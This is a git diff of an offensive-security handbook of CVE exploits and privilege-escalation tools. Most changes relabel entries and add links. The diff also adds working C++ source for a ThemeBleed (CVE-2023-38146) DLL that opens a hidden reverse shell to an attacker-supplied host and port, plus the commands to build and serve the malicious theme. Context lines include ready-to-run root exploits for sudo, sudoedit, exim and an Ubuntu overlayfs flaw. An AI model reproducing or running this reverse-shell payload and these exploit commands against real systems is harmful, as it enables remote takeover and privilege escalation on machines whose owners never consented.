@@ -9,7 +9,7 @@
 - [CVE-2014-6271: Shellshock RCE PoC](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/cve.md#CVE-2014-6271-Shellshock-RCE-PoC)
 - [CVE-2016-1531: exim LPE](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/cve.md#CVE-2016-1531-exim-LPE)
 - [CVE-2019-14287: Sudo Bypass](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/cve.md#CVE-2019-14287-Sudo-Bypass)
-- [CVE-2020-1472: ZeroLogon PE](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/cve.md#CVE-2020-1472-ZeroLogon-PE)
+- [CVE-2020-1472: ZeroLogon LPE](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/cve.md#CVE-2020-1472-ZeroLogon-LPE)
 - [CVE-2021–3156: Sudo / sudoedit LPE](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/cve.md#CVE-2021-3156-Sudo--sudoedit-LPE)
 - [CVE-2021-41773, CVE-2021-42013, CVE-2020-17519: Simples Apache Path Traversal (0-day)](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/cve.md#CVE-2021-41773-CVE-2021-42013-CVE-2020-17519-Simples-Apache-Path-Traversal-0-day)
 - [CVE-2021-43798: Grafana Directory Traversal and Arbitrary File Read (0-day)](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/cve.md#CVE-2021-43798-Grafana-Directory-Traversal-and-Arbitrary-File-Read-0-day)
@@ -23,15 +23,16 @@
 - [CVE-2023-0126: SonicWall SMA1000 Pre-Authentication Path Traversal Vulnerability](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/cve.md#CVE-2023-0126-SonicWall-SMA1000-Pre-Authentication-Path-Traversal-Vulnerability)
 - [CVE-2023-21716: Microsoft Word RTF Font Table Heap Corruption RCE PoC (Python Implementation)](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/cve.md#CVE-2023-21716-Microsoft-Word-RTF-Font-Table-Heap-Corruption-RCE-PoC-Python-Implementation)
 - [CVE-2023-21746: Windows NTLM EoP LocalPotato LPE](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/cve.md#CVE-2023-21746-Windows-NTLM-EoP-LocalPotato-LPE)
-- [CVE-2023-22809: Sudo Bypass](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/cve.md#CVE-2023-22809-Sudo-Bypass)
-- [CVE-2023-23397: Microsoft Outlook (Click-to-Run) PE (0-day) (PowerShell Implementation)](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/cve.md#CVE-2023-23397-Microsoft-Outlook-Click-to-Run-PE-0-day-PowerShell-Implementation)
+- [CVE-2023-22809: Sudo Bypass LPE](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/cve.md#CVE-2023-22809-Sudo-Bypass-LPE)
+- [CVE-2023-23397: Microsoft Outlook (Click-to-Run) LPE (0-day) (PowerShell Implementation)](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/cve.md#CVE-2023-23397-Microsoft-Outlook-Click-to-Run-LPE-0-day-PowerShell-Implementation)
 - [CVE-2023-32629, CVE-2023-2640 | GameOverlay Ubuntu Kernel Exploit LPE (0-day)](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/cve.md#CVE-2023-32629-CVE-2023-2640-GameOverlay-Ubuntu-Kernel-Exploit-LPE-0-day)
+- [CVE-2023-38146: ThemeBleed RCE](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/cve.md#CVE-2023-38146-ThemeBleed-RCE)
 - [GodPotato LPE](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/cve.md#GodPotato-LPE)
 - [Juicy Potato LPE](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/cve.md#Juicy-Potato-LPE)
 - [JuicyPotatoNG LPE](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/cve.md#JuicyPotatoNG-LPE)
 - [MySQL 4.x/5.0 User-Defined Function (UDF) Dynamic Library (2) LPE](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/cve.md#MySQL-4x50-User-Defined-Function-UDF-Dynamic-Library-2-LPE)
 - [PrintSpoofer LPE](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/cve.md#PrintSpoofer-LPE)
-- [RemotePotato0 PE](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/cve.md#RemotePotato0-PE)
+- [RemotePotato0 LPE](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/cve.md#RemotePotato0-LPE)
 - [SharpEfsPotato LPE](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/cve.md#SharpEfsPotato-LPE)
 - [Shocker Container Escape](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/cve.md#Shocker-Container-Escape)
 - [ThinkPHP < 6.0.14 Remote Code Execution RCE](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/cve.md#ThinkPHP--6014-Remote-Code-Execution-RCE)
@@ -66,10 +67,10 @@
 | CVE-2019-6447 | ES File Explorer Open Port Arbitrary File Read | https://github.com/fs0c131y/ESFileExplorerOpenPortVuln |
 | CVE-2019-7304 | dirty_sock LPE | https://github.com/initstring/dirty_sock |
 | CVE-2020-0796 | SMBGhost RCE PoC | https://github.com/chompie1337/SMBGhost_RCE_PoC |
-| CVE-2020-1472 | ZeroLogon PE Checker & Exploitation Code | https://github.com/VoidSec/CVE-2020-1472 |
-| CVE-2020-1472 | ZeroLogon PE Exploitation Script | https://github.com/risksense/zerologon |
-| CVE-2020-1472 | ZeroLogon PE PoC | https://github.com/dirkjanm/CVE-2020-1472 |
-| CVE-2020-1472 | ZeroLogon PE Testing Script | https://github.com/SecuraBV/CVE-2020-1472 |
+| CVE-2020-1472 | ZeroLogon LPE Checker & Exploitation Code | https://github.com/VoidSec/CVE-2020-1472 |
+| CVE-2020-1472 | ZeroLogon LPE Exploitation Script | https://github.com/risksense/zerologon |
+| CVE-2020-1472 | ZeroLogon LPE PoC | https://github.com/dirkjanm/CVE-2020-1472 |
+| CVE-2020-1472 | ZeroLogon LPE Testing Script | https://github.com/SecuraBV/CVE-2020-1472 |
 | CVE-2021-1675,CVE-2021-34527 | PrintNightmare LPE RCE | https://github.com/nemo-wq/PrintNightmare-CVE-2021-34527 |
 | CVE-2021-1675 | PrintNightmare LPE RCE (PowerShell Implementation) | https://github.com/calebstewart/CVE-2021-1675 |
 | CVE-2021-21972 | vCenter RCE | https://github.com/horizon3ai/CVE-2021-21972 |
@@ -97,8 +98,8 @@
 | CVE-2021-41379 | InstallerFileTakeOver LPE (0-day) (Archive) | https://github.com/klinix5/InstallerFileTakeOver |
 | CVE-2021-41379 | InstallerFileTakeOver LPE (0-day) (Fork) | https://github.com/waltlin/CVE-2021-41379-With-Public-Exploit-Lets-You-Become-An-Admin-InstallerFileTakeOver |
 | CVE-2021-41773,CVE-2021-42013, CVE-2020-17519 | Simples Apache Path Traversal (0-day) | https://github.com/MrCl0wnLab/SimplesApachePathTraversal |
-| CVE-2021-42278,CVE-2021-42287 | sam-the-admin, sAMAccountName Spoofing / Domain Admin Impersonation PE | https://github.com/WazeHell/sam-the-admin |
-| CVE-2021-42278 | sam-the-admin, sAMAccountName Spoofing / Domain Admin Impersonation PE (Python Implementation) | https://github.com/ly4k/Pachine |
+| CVE-2021-42278,CVE-2021-42287 | sam-the-admin, sAMAccountName Spoofing / Domain Admin Impersonation LPE | https://github.com/WazeHell/sam-the-admin |
+| CVE-2021-42278 | sam-the-admin, sAMAccountName Spoofing / Domain Admin Impersonation LPE (Python Implementation) | https://github.com/ly4k/Pachine |
 | CVE-2021-42287,CVE-2021-42278 | noPac LPE (1) | https://github.com/cube0x0/noPac |
 | CVE-2021-42287,CVE-2021-42278 | noPac LPE (2) | https://github.com/Ridter/noPac |
 | CVE-2021-42321 | Microsoft Exchange Server RCE | https://gist.github.com/testanull/0188c1ae847f37a70fe536123d14f398 |
@@ -121,12 +122,13 @@
 | CVE-2023-21768 | Windows Ancillary Function Driver for WinSock LPE POC | https://github.com/chompie1337/Windows_LPE_AFD_CVE-2023-21768 |
 | CVE-2023-21817 | Kerberos Unlock LPE PoC | https://gist.github.com/monoxgas/f615514fb51ebb55a7229f3cf79cf95b |
 | CVE-2023-22809 | sudoedit LPE | https://github.com/n3m1dotsys/CVE-2023-22809-sudoedit-privesc |
-| CVE-2023-23397 | Microsoft Outlook (Click-to-Run) PE (0-day) | https://github.com/sqrtZeroKnowledge/CVE-2023-23397_EXPLOIT_0DAY |
-| CVE-2023-23397 | Microsoft Outlook (Click-to-Run) PE (0-day) (PowerShell Implementation) | https://github.com/api0cradle/CVE-2023-23397-POC-Powershell |
-| CVE-2023-23397 | Microsoft Outlook (Click-to-Run) PE (0-day) (Python Implementation) | https://github.com/Trackflaw/CVE-2023-23397 |
+| CVE-2023-23397 | Microsoft Outlook (Click-to-Run) LPE (0-day) | https://github.com/sqrtZeroKnowledge/CVE-2023-23397_EXPLOIT_0DAY |
+| CVE-2023-23397 | Microsoft Outlook (Click-to-Run) LPE (0-day) (PowerShell Implementation) | https://github.com/api0cradle/CVE-2023-23397-POC-Powershell |
+| CVE-2023-23397 | Microsoft Outlook (Click-to-Run) LPE (0-day) (Python Implementation) | https://github.com/Trackflaw/CVE-2023-23397 |
 | CVE-2023-25690 | Apache mod_proxy HTTP Request Smuggling PoC | https://github.com/dhmosfunk/CVE-2023-25690-POC |
+| CVE-2023-28252 | Windows Common Log File System Driver LPE | https://github.com/fortra/CVE-2023-28252 |
 | CVE-2023-28879 | Shell in the Ghost: Ghostscript RCE PoC | https://github.com/AlmondOffSec/PoCs/tree/master/Ghostscript_rce |
-| CVE-2023-29357 | Microsoft SharePoint Server PE | https://github.com/Chocapikk/CVE-2023-29357 |
+| CVE-2023-29357 | Microsoft SharePoint Server LPE | https://github.com/Chocapikk/CVE-2023-29357 |
 | CVE-2023-32233 | Use-After-Free in Netfilter nf_tables LPE | https://github.com/Liuk3r/CVE-2023-32233 |
 | CVE-2023-32629, CVE-2023-2640 | GameOverlay Ubuntu Kernel Exploit LPE (0-day) | https://twitter.com/liadeliyahu/status/1684841527959273472?s=09 |
 | CVE-2023-36874 | Windows Error Reporting Service LPE (0-day) | https://github.com/Wh04m1001/CVE-2023-36874 |
@@ -141,7 +143,7 @@
 | n/a | JuicyPotato LPE | https://github.com/ohpe/juicy-potato |
 | n/a | Juice-PotatoNG LPE | https://github.com/antonioCoco/JuicyPotatoNG |
 | n/a | MultiPotato LPE | https://github.com/S3cur3Th1sSh1t/MultiPotato |
-| n/a | RemotePotato0 PE | https://github.com/antonioCoco/RemotePotato0 |
+| n/a | RemotePotato0 LPE | https://github.com/antonioCoco/RemotePotato0 |
 | n/a | RoguePotato LPE | https://github.com/antonioCoco/RoguePotato |
 | n/a | RottenPotatoNG LPE | https://github.com/breenmachine/RottenPotatoNG |
 | n/a | SharpEfsPotato LPE | https://github.com/bugch3ck/SharpEfsPotato |
@@ -151,7 +153,7 @@
 | n/a | PrintSpoofer LPE (1) | https://github.com/dievus/printspoofer |
 | n/a | PrintSpoofer LPE (2) | https://github.com/itm4n/PrintSpoofer |
 | n/a | Shocker Container Escape | https://github.com/gabrtv/shocker |
-| n/a | SystemNightmare PE | https://github.com/GossiTheDog/SystemNightmare |
+| n/a | SystemNightmare LPE | https://github.com/GossiTheDog/SystemNightmare |
 | n/a | NoFilter LPE | https://github.com/deepinstinct/NoFilter |
 | n/a | OfflineSAM LPE | https://github.com/gtworek/PSBits/tree/master/OfflineSAM |
 | n/a | OfflineAddAdmin2 LPE | https://github.com/gtworek/PSBits/tree/master/OfflineSAM/OfflineAddAdmin2 |
@@ -241,7 +243,7 @@ PERL5LIB=/tmp PERL5OPT=-Mroot /usr/exim/bin/exim -ps
 $ sudo -u#-1 /bin/bash
 ```
 
-## CVE-2020-1472: ZeroLogon PE
+## CVE-2020-1472: ZeroLogon LPE
 
 > https://github.com/SecuraBV/CVE-2020-1472
 
@@ -834,14 +836,14 @@ while True:
         break
 ```
 
-### First Terminal
+#### First Terminal
 
 ```c
 $ ./firejoin_py.bin
 You can now run 'firejail --join=193982' in another terminal to obtain a shell where 'sudo su -' should grant you a root shell.
 ```
 
-### Second Terminal
+#### Second Terminal
 
 ```c
 $ firejail --join=193982
@@ -973,7 +975,7 @@ At least trigger `StorSvc` via `RpcClient.exe`.
 C:\> RpcClient.exe
 ```
 
-## CVE-2023-22809: Sudo Bypass
+## CVE-2023-22809: Sudo Bypass LPE
 
 > https://medium.com/@dev.nest/how-to-bypass-sudo-exploit-cve-2023-22809-vulnerability-296ef10a1466
 
@@ -998,7 +1000,7 @@ EDITOR="vi -- /etc/passwd" sudoedit /etc/motd
 $ sudoedit /etc/motd
 ```
 
-## CVE-2023-23397: Microsoft Outlook (Click-to-Run) PE (0-day) (PowerShell Implementation)
+## CVE-2023-23397: Microsoft Outlook (Click-to-Run) LPE (0-day) (PowerShell Implementation)
 
 ```c
 PS C:\> Import-Module .\CVE-2023-23397.ps1
@@ -1016,11 +1018,116 @@ $ unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;
 setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("id")'
 ```
 
+## CVE-2023-38146: ThemeBleed RCE
+
+> https://github.com/gabe-k/themebleed
+
+Create a new `C++ Console Application`.
+
+### rev.cpp
+
+Source Files > Add > New Item...
+
+```c
+#include "pch.h"
+#include <stdio.h>
+#include <string.h>
+#include <process.h>
+#include <winsock2.h>
+#include <ws2tcpip.h>
+#include <stdlib.h>
+#pragma comment(lib, "Ws2_32.lib")
+#include "rev.h"
+using namespace std;
+
+void rev_shell()
+{
+  FreeConsole();
+
+  const char* REMOTE_ADDR = "<LHOST>";
+  const char* REMOTE_PORT = "<LPORT>";
+
+  WSADATA wsaData;
+  int iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
+  struct addrinfo* result = NULL, * ptr = NULL, hints;
+  memset(&hints, 0, sizeof(hints));
+  hints.ai_family = AF_UNSPEC;
+  hints.ai_socktype = SOCK_STREAM;
+  hints.ai_protocol = IPPROTO_TCP;
+  getaddrinfo(REMOTE_ADDR, REMOTE_PORT, &hints, &result);
+  ptr = result;
+  SOCKET ConnectSocket = WSASocket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol, NULL, NULL, NULL);
+  connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
+  STARTUPINFO si;
+  PROCESS_INFORMATION pi;
+  ZeroMemory(&si, sizeof(si));
+  si.cb = sizeof(si);
+  ZeroMemory(&pi, sizeof(pi));
+  si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
+  si.wShowWindow = SW_HIDE;
+  si.hStdInput = (HANDLE)ConnectSocket;
+  si.hStdOutput = (HANDLE)ConnectSocket;
+  si.hStdError = (HANDLE)ConnectSocket;
+  TCHAR cmd[] = TEXT("C:\\WINDOWS\\SYSTEM32\\CMD.EXE");
+  CreateProcess(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
+  WaitForSingleObject(pi.hProcess, INFINITE);
+  CloseHandle(pi.hProcess);
+  CloseHandle(pi.hThread);
+  WSACleanup();
+}
+
+int VerifyThemeVersion(void)
+{
+  rev_shell();
+  return 0;
+}
+```
+
+### rev.h
+
+Header Files > Add > New Item...
+
+```c
+#pragma once
+
+extern "C" __declspec(dllexport) int VerifyThemeVersion(void);
+```
+
+### pch.h
+
+```c
+// pch.h: This is a precompiled header file.
+// Files listed below are compiled only once, improving build performance for future builds.
+// This also affects IntelliSense performance, including code completion and many code browsing features.
+// However, files listed here are ALL re-compiled if any one of them is updated between builds.
+// Do not add files here that you will be updating frequently as this negates the performance advantage.
+
+#ifndef PCH_H
+#define PCH_H
+
+// add headers that you want to pre-compile here
+#include "framework.h"
+#include "rev.h"
+
+#endif //PCH_H
+
+```
+
+```c
+PS C:\> .\ThemeBleed.exe make_theme <LHOST> aero.theme
+```
+
+```c
+PS C:\> .\ThemeBleed.exe server
+```
+
 ## GodPotato LPE
 
 > https://github.com/BeichenDream/GodPotato
 
 ```c
+PS C:\> .\GodPotato-NET2.exe -cmd '<COMMAND>'
+PS C:\> .\GodPotato-NET35.exe -cmd '<COMMAND>'
 PS C:\> .\GodPotato-NET4.exe -cmd '<COMMAND>'
 ```
 
@@ -1134,10 +1241,10 @@ $ mysql -u root
 > https://github.com/itm4n/PrintSpoofer
 
 ```c
-PS C:\> .\PrintSpoofer64.exe -i -c powershell
+PS C:\> .\PrintSpoofer.exe -i -c powershell
 ```
 
-## RemotePotato0 PE
+## RemotePotato0 LPE
 
 > https://github.com/antonioCoco/RemotePotato0
 
